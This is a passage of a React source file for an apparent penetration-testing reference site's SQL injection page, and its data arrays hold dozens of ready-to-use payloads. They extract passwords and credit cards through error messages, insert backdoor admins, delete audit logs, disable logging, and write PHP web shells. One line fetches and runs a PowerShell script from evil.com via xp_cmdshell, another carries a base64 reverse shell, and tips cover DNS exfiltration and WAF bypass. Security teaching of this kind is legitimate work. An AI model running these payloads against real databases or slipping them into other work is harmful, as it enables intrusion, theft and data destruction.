          code: "' AND JSON_EXTRACT('{}', CONCAT('$', (SELECT password FROM users WHERE id=1)))--",
          database: "MySQL",
          complexity: "Intermediate",
          technique: "Data Extraction",
          description: "Invalid JSON path triggers error containing extracted password. Works in MySQL 5.7+ with JSON support.",
          difficulty: "intermediate"
        },
        {
          name: "PostgreSQL Error with CAST",
          code: "' AND 1=CAST((SELECT version()) AS INT)--",
          database: "PostgreSQL",
          complexity: "Intermediate",
          technique: "Fingerprinting",
          description: "PostgreSQL type casting error reveals database version in error message.",
          difficulty: "intermediate"
        },
        {
          name: "XML Path Error (SQL Server)",
          code: "' AND 1=(SELECT table_name FROM information_schema.tables FOR XML PATH)--",
          database: "MSSQL",
          complexity: "Intermediate",
          technique: "Schema Discovery",
          description: "SQL Server XML PATH error exposes table names in error output. Enumerates database schema.",
          difficulty: "intermediate"
        },
        {
          name: "Geometric Function Error",
          code: "' AND GeometryType((SELECT * FROM (SELECT password FROM users WHERE id=1) AS geom))--",
          database: "MySQL",
          complexity: "Advanced",
          technique: "Data Extraction",
          description: "MySQL geometric function expects specific type, error reveals actual data. Obscure technique bypassing common filters.",
          difficulty: "advanced"
        },
        {
          name: "Polygon Error Extraction",
          code: "' AND POLYGON((SELECT * FROM (SELECT CONCAT(username, ':', password) FROM users WHERE id=1) AS p))--",
          database: "MySQL",
          complexity: "Advanced",
          technique: "Data Extraction",
          description: "Invalid polygon definition error includes concatenated username:password in error text.",
          difficulty: "advanced"
        },
        {
          name: "FLOOR Double Error",
          code: "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT password FROM users WHERE id=1), FLOOR(RAND(0)*2)) AS x FROM information_schema.tables GROUP BY x) AS y)--",
          database: "MySQL",
          complexity: "Advanced",
          technique: "Data Extraction",
          description: "MySQL double query error-based technique. Complex but highly effective for extracting data via GROUP BY duplicate key errors.",
          difficulty: "advanced"
        },
        {
          name: "NAME_CONST Error",
          code: "' AND (SELECT * FROM (SELECT NAME_CONST(version(), 1), NAME_CONST(version(), 1)) AS x)--",
          database: "MySQL",
          complexity: "Advanced",
          technique: "Fingerprinting",
          description: "Duplicate column name error reveals database version. Works by creating conflicting NAME_CONST declarations.",
          difficulty: "advanced"
        },
        {
          name: "BIGINT Overflow Error",
          code: "' AND (SELECT 2147483647+2147483647)--",
          database: "MySQL",
          complexity: "Advanced",
          technique: "Verification",
          description: "Integer overflow error in older MySQL versions. Useful for confirming injection in restricted environments.",
          difficulty: "advanced"
        },
        {
          name: "XPATH Error with Subquery",
          code: "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(username, ':', password) FROM users)))--",
          database: "MySQL",
          complexity: "Advanced",
          technique: "Data Extraction",
          description: "Extracts multiple records in single error message using GROUP_CONCAT. Efficient bulk data extraction.",
          difficulty: "advanced"
        },
        {
          name: "EXP Overflow Error",
          code: "' AND EXP(~(SELECT * FROM (SELECT password FROM users WHERE id=1) AS x))--",
          database: "MySQL",
          complexity: "Advanced",
          technique: "Data Extraction",
          description: "Mathematical overflow error with bitwise NOT operator. Error message contains extracted password.",
          difficulty: "advanced"
        },
        {
          name: "Multipoint Error Extraction",
          code: "' AND MULTIPOINT((SELECT * FROM (SELECT CONCAT('POINT(', username, ' ', password, ')') FROM users WHERE id=1) AS mp))--",
          database: "MySQL",
          complexity: "Advanced",
          technique: "Data Extraction",
          description: "Geometric MULTIPOINT function error reveals username and password in spatial error message.",
          difficulty: "advanced"
        },
        {
          name: "LINESTRING Error-based",
          code: "' AND LINESTRING((SELECT * FROM (SELECT GROUP_CONCAT(CONCAT('POINT(', id, ' ', credit_card, ')')) FROM payments) AS l))--",
          database: "MySQL",
          complexity: "Advanced",
          technique: "Data Extraction",
          description: "Spatial function LINESTRING error extracts payment data. Concatenates IDs and credit cards in error output.",
          difficulty: "advanced"
        },
        {
          name: "GEOMETRYCOLLECTION Error",
          code: "' AND GEOMETRYCOLLECTION((SELECT * FROM (SELECT CONCAT(table_name, ':', column_name) FROM information_schema.columns) AS gc))--",
          database: "MySQL",
          complexity: "Advanced",
          technique: "Schema Discovery",
          description: "Schema enumeration via GEOMETRYCOLLECTION error. Lists all tables and columns in error message.",
          difficulty: "advanced"
        },
        {
          name: "GTID_SUBSET Error",
          code: "' AND GTID_SUBSET(CONCAT('x', (SELECT password FROM users WHERE id=1)), 'y')--",
          database: "MySQL",
          complexity: "Advanced",
          technique: "Data Extraction",
          description: "MySQL replication function error extracts password. Obscure function unlikely to be filtered.",
          difficulty: "advanced"
        },
        {
          name: "UUID_SHORT Collision Error",
          code: "' AND (SELECT * FROM (SELECT UUID_SHORT() AS u1, UUID_SHORT() AS u2, (SELECT password FROM users WHERE id=1) AS data) AS x)--",
          database: "MySQL",
          complexity: "Advanced",
          technique: "Data Extraction",
          description: "Creates impossible UUID collision scenario. Error message includes extracted password from subquery.",
          difficulty: "advanced"
        }
      ]
    },
    "stacked-queries": {
      title: "Stacked Queries SQL Injection",
      explanation: "Stacked queries (also called piggy-backed or batched queries) allow execution of multiple SQL statements in a single query by using the semicolon separator. This technique enables attackers to run arbitrary SQL commands beyond data extraction, including INSERT, UPDATE, DELETE, and even system commands on vulnerable databases. While not all database/driver combinations support stacked queries, when available, this represents one of the most powerful SQL injection attack vectors.",
      whereItAppears: [
        "API endpoints using database drivers that support batch execution",
        "Legacy applications with poorly configured database connections",
        "Applications using direct SQL execution without parameterized queries",
        "Admin interfaces with privileged database connections",
        "Stored procedure execution points with elevated permissions",
        "Database management interfaces and SQL query builders"
      ],
      impact: "Stacked queries enable complete database control including data modification (INSERT/UPDATE/DELETE), schema changes (DROP/CREATE), privilege escalation (GRANT), and on some databases (MSSQL), operating system command execution via xp_cmdshell. This can lead to complete system compromise, persistent backdoors, data destruction, and lateral movement across the network. The ability to execute arbitrary statements makes this significantly more dangerous than read-only injection techniques.",
      realWorldScenarios: [
        {
          title: "Database Backdoor Creation",
          scenario: "An attacker uses stacked queries to insert a new admin user into the application's user table, creating a persistent backdoor for future unauthorized access.",
          payload: "'; INSERT INTO users(username, password, role) VALUES('backdoor', 'hashed_password', 'admin');--",
          impact: "Persistent unauthorized admin access, complete application takeover, ability to return at any time using the created credentials."
        },
        {
          title: "MSSQL Command Execution",
          scenario: "On a Microsoft SQL Server with xp_cmdshell enabled, attacker executes operating system commands to download and run a reverse shell.",
          payload: "'; EXEC xp_cmdshell 'powershell -c IEX(IWR https://evil.com/shell.ps1)';--",
          impact: "Full server compromise, reverse shell access, ability to pivot to internal network, ransomware deployment."
        },
        {
          title: "Data Destruction Attack",
          scenario: "Malicious actor uses stacked queries to drop critical database tables, causing massive data loss and service disruption.",
          payload: "'; DROP TABLE customers; DROP TABLE orders; DROP TABLE products;--",
          impact: "Complete data loss, business disruption, potential unrecoverable damage if backups are not available."
        }
      ],
      payloads: [
        {
          name: "Basic Stacked Query Test",
          code: "'; SELECT SLEEP(5);--",
          database: "MySQL",
          complexity: "Beginner",
          technique: "Verification",
          description: "Tests if stacked queries are supported using time delay. If page response is delayed by 5 seconds, stacked queries work.",
          difficulty: "beginner"
        },
        {
          name: "MSSQL Stacked Query Test",
          code: "'; WAITFOR DELAY '0:0:5';--",
          database: "MSSQL",
          complexity: "Beginner",
          technique: "Verification",
          description: "Tests stacked query support on SQL Server using WAITFOR DELAY. 5-second delay confirms vulnerability.",
          difficulty: "beginner"
        },
        {
          name: "Insert Admin User",
          code: "'; INSERT INTO users (username, password, is_admin) VALUES ('hacker', 'password123', 1);--",
          database: "MySQL",
          complexity: "Intermediate",
          technique: "Data Manipulation",
          description: "Creates new admin user in database for persistent access. Requires knowledge of table structure.",
          difficulty: "intermediate"
        },
        {
          name: "Update User Password",
          code: "'; UPDATE users SET password='newpassword' WHERE username='admin';--",
          database: "MySQL",
          complexity: "Intermediate",
          technique: "Data Manipulation",
          description: "Changes admin password to known value for account takeover. Highly effective if you know username exists.",
          difficulty: "intermediate"
        },
        {
          name: "Delete Audit Logs",
          code: "'; DELETE FROM audit_logs WHERE 1=1;--",
          database: "MySQL",
          complexity: "Intermediate",
          technique: "Data Manipulation",
          description: "Deletes all audit trail records to cover tracks. Often done after successful attack to hide evidence.",
          difficulty: "intermediate"
        },
        {
          name: "MSSQL Enable xp_cmdshell",
          code: "'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--",
          database: "MSSQL",
          complexity: "Advanced",
          technique: "Privilege Escalation",
          description: "Enables xp_cmdshell stored procedure for OS command execution. Required before running system commands.",
          difficulty: "advanced"
        },
        {
          name: "MSSQL Command Execution",
          code: "'; EXEC xp_cmdshell 'whoami';--",
          database: "MSSQL",
          complexity: "Advanced",
          technique: "Command Execution",
          description: "Executes operating system command via xp_cmdshell. Returns current user context of SQL Server service.",
          difficulty: "advanced"
        },
        {
          name: "MSSQL Reverse Shell",
          code: "'; EXEC xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMAAuADAALgAxACIALAA0ADQANAA0ACkA';--",
          database: "MSSQL",
          complexity: "Advanced",
          technique: "Command Execution",
          description: "PowerShell-based reverse shell via xp_cmdshell. Base64 encoded to bypass command line restrictions.",
          difficulty: "advanced"
        },
        {
          name: "PostgreSQL File Write",
          code: "'; COPY (SELECT '<?php system($_GET[\"cmd\"]); ?>') TO '/var/www/html/shell.php';--",
          database: "PostgreSQL",
          complexity: "Advanced",
          technique: "Persistence",
          description: "Writes PHP web shell to web root for persistent access. Requires write permissions to web directory.",
          difficulty: "advanced"
        },
        {
          name: "PostgreSQL Create Table",
          code: "'; CREATE TABLE exfil (data TEXT); COPY exfil FROM '/etc/passwd';--",
          database: "PostgreSQL",
          complexity: "Advanced",
          technique: "Data Extraction",
          description: "Creates table and copies file contents into it for later extraction. Useful for file system access.",
          difficulty: "advanced"
        },
        {
          name: "MySQL File Write",
          code: "'; SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/html/backdoor.php';--",
          database: "MySQL",
          complexity: "Advanced",
          technique: "Persistence",
          description: "Writes web shell using INTO OUTFILE. Requires FILE privilege and secure_file_priv not set.",
          difficulty: "advanced"
        },
        {
          name: "Grant All Privileges",
          code: "'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%' IDENTIFIED BY 'password' WITH GRANT OPTION;--",
          database: "MySQL",
          complexity: "Advanced",
          technique: "Privilege Escalation",
          description: "Creates super user with all database privileges accessible from any host. Complete database takeover.",
          difficulty: "advanced"
        },
        {
          name: "Oracle Execute Immediate",
          code: "'; EXECUTE IMMEDIATE 'CREATE USER hacker IDENTIFIED BY password123';--",
          database: "Oracle",
          complexity: "Advanced",
          technique: "Privilege Escalation",
          description: "Creates new Oracle database user using EXECUTE IMMEDIATE. Requires CREATE USER privilege.",
          difficulty: "advanced"
        },
        {
          name: "Drop Table Attack",
          code: "'; DROP TABLE users;--",
          database: "MySQL",
          complexity: "Intermediate",
          technique: "Data Manipulation",
          description: "Destructive attack that removes entire table. Can cause catastrophic data loss if backups don't exist.",
          difficulty: "intermediate"
        },
        {
          name: "Truncate Table Attack",
          code: "'; TRUNCATE TABLE orders;--",
          database: "MySQL",
          complexity: "Intermediate",
          technique: "Data Manipulation",
          description: "Removes all data from table without dropping structure. Faster than DELETE and can't be rolled back easily.",
          difficulty: "intermediate"
        },
        {
          name: "Create Trigger Backdoor",
          code: "'; CREATE TRIGGER backdoor AFTER INSERT ON users FOR EACH ROW EXECUTE PROCEDURE log_to_external();--",
          database: "PostgreSQL",
          complexity: "Advanced",
          technique: "Persistence",
          description: "Creates database trigger for persistent backdoor. Executes on every insert, survives restarts.",
          difficulty: "advanced"
        },
        {
          name: "MSSQL Add Admin User",
          code: "'; EXEC sp_addlogin 'hacker', 'Password123!'; EXEC sp_addsrvrolemember 'hacker', 'sysadmin';--",
          database: "MSSQL",
          complexity: "Advanced",
          technique: "Privilege Escalation",
          description: "Creates SQL Server login and adds to sysadmin role. Complete database server compromise.",
          difficulty: "advanced"
        },
        {
          name: "Disable Security Features",
          code: "'; UPDATE pg_settings SET setting='off' WHERE name='log_statement';--",
          database: "PostgreSQL",
          complexity: "Advanced",
          technique: "Evasion",
          description: "Disables query logging to hide malicious activity. Part of covering tracks after compromise.",
          difficulty: "advanced"
        },
        {
          name: "MSSQL OLE Automation",
          code: "'; DECLARE @shell INT; EXEC sp_oacreate 'wscript.shell', @shell OUTPUT; EXEC sp_oamethod @shell, 'run', null, 'cmd.exe /c whoami > C:\\\\output.txt';--",
          database: "MSSQL",
          complexity: "Advanced",
          technique: "Command Execution",
          description: "Uses OLE Automation procedures for command execution when xp_cmdshell is disabled.",
          difficulty: "advanced"
        },
        {
          name: "Batch Delete with Condition",
          code: "'; DELETE FROM sessions WHERE user_id != (SELECT id FROM users WHERE username='hacker');--",
          database: "MySQL",
          complexity: "Intermediate",
          technique: "Data Manipulation",
          description: "Logs out all users except attacker by deleting their sessions. Maintains attacker access while disrupting others.",
          difficulty: "intermediate"
        }
      ]
    }
  };

  const commonMistakes = [
    {
      title: "Testing Only SELECT Statements",
      description: "Many testers focus only on SELECT injection and miss INSERT, UPDATE, DELETE, and stored procedure vulnerabilities. SQL injection exists wherever dynamic SQL is constructed, not just in data retrieval queries.",
      icon: "AlertCircle"
    },
    {
      title: "Ignoring Second-Order SQL Injection",
      description: "Overlooking stored XSS equivalent in SQL: data injected safely is later used in unsafe SQL query. Test data storage points separately from immediate injection, as malicious payloads may execute later.",
      icon: "Code"
    },
    {
      title: "Not Testing Different SQL Contexts",
      description: "Different injection points require different payloads: WHERE clauses, INSERT values, ORDER BY, LIMIT, stored procedure parameters all have unique escape requirements and exploitation techniques.",
      icon: "Hash"
    },
    {
      title: "Assuming WAF = Protected",
      description: "WAFs are bypassable through encoding, case variation, comment obfuscation, and HTTP parameter pollution. Never assume WAF presence means no vulnerability – test thoroughly with evasion techniques.",
      icon: "Shield"
    },
    {
      title: "Missing Out-of-Band Exfiltration",
      description: "Not testing DNS exfiltration, HTTP callbacks, or file system writes. When direct data retrieval fails, try out-of-band channels: LOAD_FILE, xp_cmdshell, UTL_HTTP in Oracle.",
      icon: "Database"
    },
    {
      title: "Testing Only One Database Type",
      description: "SQL syntax varies significantly between MySQL, PostgreSQL, MSSQL, Oracle. What works in MySQL fails in PostgreSQL. Learn database-specific functions, syntax quirks, and error handling.",
      icon: "Eye"
    }
  ];

  const proTips = [
    {
      title: "Master Boolean Blind Binary Search",
      tip: "When blind injection is your only option, use binary search on ASCII values to extract data exponentially faster. Instead of testing each character (26 requests), binary search needs only ~8 requests per character: test if ASCII > 77, then > 115 or < 77, etc. Reduces 1000-request attack to ~80 requests.",
      icon: "Target"
    },
    {
      title: "Time-based Delays Must Be Reliable",
      tip: "Network latency kills time-based injection detection. Use delays of 5+ seconds minimum. Test network baseline first: measure normal response time, then delay should be 3x-5x baseline minimum. Use BENCHMARK for CPU-based delays when SLEEP is filtered.",
      icon: "Search"
    },
    {
      title: "Second-Order SQL Injection Often in Admin",
      tip: "Admin panels, user management, and reporting features frequently have second-order SQLi. Register user with SQL payload, then search/sort/filter on that data in admin panel. The vulnerability triggers later when admin processes your stored malicious username/bio/email.",
      icon: "ShieldAlert"
    },
    {
      title: "Stack Multiple Encoding Layers",
      tip: "Bypass WAFs by chaining encodings: URL encode, then hex encode, then char() function encoding. Example: ' becomes %27 becomes 0x2527 becomes CHAR(37)+CHAR(50)+CHAR(55). Most WAFs decode only once, missing multi-layer obfuscation.",
      icon: "Zap"
    },
    {
      title: "Use Database Differences to Your Advantage",
      tip: "MySQL allows stacked queries in some contexts, PostgreSQL has powerful extensions (pg_read_file), MSSQL has xp_cmdshell for command execution, Oracle has UTL_HTTP for SSRF. Learn each database's unique attack surface.",
      icon: "Layers"
    },
    {
      title: "Extract Data Through DNS Queries",
      tip: "When HTTP responses are blocked but DNS works: use LOAD_FILE in MySQL with UNC paths (\\\\attacker.com\\share), Oracle's UTL_HTTP, or SQL Server's xp_dirtree to exfiltrate data via DNS lookups. Monitor your authoritative DNS server for subdomain queries containing data.",
      icon: "Cpu"
    }
  ];

  const currentSQLData = sqlTypes?.[activeSQLType];

  useEffect(() => {
    filterPayloads();
  }, [filters, activeSQLType, isProMode]);

  const filterPayloads = () => {
    let filtered = [...currentSQLData?.payloads];

    // Filter by difficulty based on mode
    if (!isProMode) {
      // Beginner mode: only show beginner and intermediate difficulty
      filtered = filtered?.filter(p => 
        p?.difficulty === 'beginner' || p?.difficulty === 'intermediate'
      );
    }
    // Elite mode shows all payloads (no difficulty filter)

    // Apply database filter
    if (filters?.database !== 'All') {
      filtered = filtered?.filter(p => p?.database === filters?.database);
    }

    // Apply complexity filter
    if (filters?.complexity !== 'All') {
      filtered = filtered?.filter(p => p?.complexity === filters?.complexity);
    }

    // Apply technique filter
    if (filters?.technique !== 'All') {
      filtered = filtered?.filter(p => p?.technique === filters?.technique);
    }

    setFilteredPayloads(filtered);
  };

  const handleFilterChange = (filterType, value) => {
    setFilters(prev => ({
      ...prev,
      [filterType]: value
    }));
  };

  const handleModeToggle = (isPro) => {
    setIsProMode(isPro);
  };

  return (
    <>
      <Helmet>
        <title>SQL Injection - Comprehensive Attack Guide - TrinetLayer</title>
        <meta name="description" content="Master SQL injection with 20+ real-world payloads across Union-based, Boolean-based, Time-based, and Error-based techniques. Complete database exploitation guide for penetration testers." />
        <meta name="keywords" content="SQL injection, SQLi, database hacking, union-based injection, blind SQL injection, time-based SQLi, error-based injection, database security, penetration testing" />
      </Helmet>
      <div className="min-h-screen bg-background">
        <Sidebar />

        <main className="lg:ml-[280px] min-h-screen lg:w-[calc(100%-280px)] overflow-x-hidden">
          <div className="sticky top-0 z-40 bg-background/80 backdrop-blur-xl border-b border-border">
            <div className="max-w-[1400px] mx-auto pl-16 pr-4 md:px-6 lg:px-8 py-4 md:py-5">
              <GlobalSearch />
            </div>
          </div>

          <div className="max-w-[1400px] mx-auto px-4 md:px-6 lg:px-8 py-6 md:py-8 lg:py-10">
            <Breadcrumb />

            <VulnerabilityHeader
              title="SQL Injection (SQLi)"
              severity="critical"
              lastUpdated="Everyday"
            />

            {/* SQL Type Selector */}
            <div className="mb-8 bg-surface border border-border rounded-xl p-6">
              <h3 className="text-lg font-semibold text-foreground mb-4">
                Select SQL Injection Type
              </h3>
              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-5 gap-4">
                {Object.entries(sqlTypes)?.map(([key, data]) => (
                  <button
                    key={key}
                    onClick={() => setActiveSQLType(key)}
                    className={`p-4 rounded-lg border-2 transition-all ${
                      activeSQLType === key
                        ? 'border-accent bg-accent/10 text-accent' :'border-border bg-background text-muted-foreground hover:border-accent/50'
                    }`}
                  >
                    <div className="text-left">
                      <div className="font-semibold mb-1">{data?.title}</div>
                      <div className="text-sm opacity-80">{data?.payloads?.length} Payloads</div>
                    </div>
                  </button>
                ))}
              </div>
            </div>

            {/* Current SQL Type Content */}
            <div className="mb-8 bg-surface border border-border rounded-xl p-6">
              <h2 className="text-2xl font-bold text-foreground mb-4">
                {currentSQLData?.title}
              </h2>
              
              {/* Explanation */}
              <div className="mb-6">
                <h3 className="text-lg font-semibold text-foreground mb-3">
                  What is {currentSQLData?.title}?
                </h3>
                <p className="text-muted-foreground leading-relaxed">
                  {currentSQLData?.explanation}
                </p>
              </div>

              {/* Where It Appears */}
              <div className="mb-6">
                <h3 className="text-lg font-semibold text-foreground mb-3">
                  Where It Appears
                </h3>
                <ul className="space-y-2">
                  {currentSQLData?.whereItAppears?.map((location, index) => (
                    <li key={index} className="flex items-start gap-2 text-muted-foreground">
                      <span className="text-accent mt-1">▸</span>
                      <span>{location}</span>
                    </li>
                  ))}
                </ul>
              </div>

              {/* Impact */}
              <div className="mb-6">
                <h3 className="text-lg font-semibold text-foreground mb-3">
                  Impact & Consequences
                </h3>
                <p className="text-muted-foreground leading-relaxed">
                  {currentSQLData?.impact}
                </p>
              </div>

              {/* Real-World Scenarios */}
              {currentSQLData?.realWorldScenarios && (
                <div className="mb-6">
                  <h3 className="text-lg font-semibold text-foreground mb-4">
                    Real-World Attack Scenarios
                  </h3>
                  <div className="space-y-4">
                    {currentSQLData?.realWorldScenarios?.map((scenario, index) => (
                      <div key={index} className="bg-background border border-border rounded-lg p-5">
                        <h4 className="font-semibold text-foreground mb-2">
                          {scenario?.title}
                        </h4>
                        <p className="text-sm text-muted-foreground mb-3">
                          {scenario?.scenario}
                        </p>
                        <div className="bg-surface border border-accent/20 rounded p-3 mb-3">
                          <div className="text-xs text-muted-foreground mb-1">Attack Payload:</div>
                          <code className="text-sm text-accent font-medium">{scenario?.payload}</code>
                        </div>
                        <div className="text-sm text-warning">
                          <strong>Impact:</strong> {scenario?.impact}
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              )}
            </div>

            <FilterControls
              filters={filters}
              onFilterChange={handleFilterChange}
              isProMode={isProMode}
              onModeToggle={handleModeToggle}
              sqlType={activeSQLType}
            />

            {/* Payloads Section */}
            <div className="mb-6 md:mb-8 lg:mb-10">
              <div className="flex items-center justify-between mb-6 md:mb-8">
                <h2 className="text-xl md:text-2xl lg:text-3xl font-semibold text-foreground">
                  {currentSQLData?.title} Payloads
                </h2>
                <div className="flex items-center gap-3">
                  <div className="text-sm md:text-base text-muted-foreground font-medium">
                    {filteredPayloads?.length} {filteredPayloads?.length === 1 ? 'payload' : 'payloads'}
                  </div>
                  {!isProMode && (
                    <div className="px-3 py-1 bg-accent/10 border border-accent/30 rounded-lg">
                      <span className="text-xs font-medium text-accent">Beginner-Friendly Mode</span>
                    </div>
                  )}
                </div>
              </div>

              <div className="grid grid-cols-1 gap-6 md:gap-8">
                {filteredPayloads?.map((payload, index) => (
                  <PayloadCard
                    key={index}
                    payload={payload}
                    isProMode={isProMode}
                  />
                ))}
              </div>

              {filteredPayloads?.length === 0 && (
                <div className="text-center py-12 md:py-16 lg:py-20">
                  <div className="w-16 h-16 md:w-20 md:h-20 mx-auto mb-4 md:mb-6 flex items-center justify-center bg-muted/30 border border-border rounded-xl">
                    <svg className="w-8 h-8 md:w-10 md:h-10 text-muted-foreground" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
                    </svg>
                  </div>
                  <h3 className="text-lg md:text-xl font-body font-medium text-foreground mb-2">
                    No payloads found
                  </h3>
                  <p className="text-sm md:text-base text-muted-foreground font-medium">
                    Try adjusting your filters to see more results
                  </p>
                </div>
              )}
            </div>

            {/* Common Mistakes */}
            <div className="mb-8 bg-surface border border-border rounded-xl p-6">
              <h2 className="text-2xl font-bold text-foreground mb-6">
                Common Testing Mistakes
              </h2>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                {commonMistakes?.map((mistake, index) => (
                  <div key={index} className="flex gap-4 p-4 bg-background border border-border rounded-lg">
                    <div className="flex-shrink-0">
                      <div className="w-10 h-10 rounded-lg bg-warning/10 flex items-center justify-center">
                        <svg className="w-5 h-5 text-warning" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
                        </svg>
                      </div>
                    </div>
                    <div>
                      <h3 className="font-semibold text-foreground mb-2">{mistake?.title}</h3>
                      <p className="text-sm text-muted-foreground">{mistake?.description}</p>
                    </div>
                  </div>
                ))}
              </div>
            </div>

            {/* Pro Bug Hunter Tips */}
            <div className="mb-8 bg-surface border border-border rounded-xl p-6">
              <h2 className="text-2xl font-bold text-foreground mb-6">
                Pro Bug Hunter Tips
              </h2>
              <div className="space-y-4">
                {proTips?.map((tip, index) => (
                  <div key={index} className="flex gap-4 p-4 bg-background border border-border rounded-lg">
                    <div className="flex-shrink-0">
                      <div className="w-10 h-10 rounded-lg bg-accent/10 flex items-center justify-center">
                        <svg className="w-5 h-5 text-accent" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 10V3L4 14h7v7l9-11h-7z" />
                        </svg>
                      </div>
                    </div>
                    <div>
                      <h3 className="font-semibold text-foreground mb-2">{tip?.title}</h3>
                      <p className="text-sm text-muted-foreground">{tip?.tip}</p>
                    </div>
                  </div>
                ))}
              </div>
            </div>

            {/* Disclaimer */}
            <div className="mb-8 bg-warning/10 border border-warning/30 rounded-xl p-6">
              <div className="flex items-start gap-4">
                <div className="flex-shrink-0">
                  <svg className="w-6 h-6 text-warning" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" />
                  </svg>
                </div>
                <div>
                  <h3 className="font-semibold text-foreground mb-2">⚠️ Legal Disclaimer</h3>
                  <p className="text-sm text-muted-foreground">
                    <strong>Educational and authorized security testing only.</strong> SQL injection techniques described here are for ethical hacking, authorized penetration testing, and bug bounty programs where you have explicit written permission. Unauthorized database access is a federal crime under CFAA and equivalent laws worldwide. Test only systems you own or have authorization to test. Misuse can result in criminal prosecution, imprisonment, and severe financial penalties.
                  </p>
                </div>
              </div>
            </div>
          </div>
        </main>
      </div>
    </>
  );
};

export default SQLInjectionVulnerabilityDetails;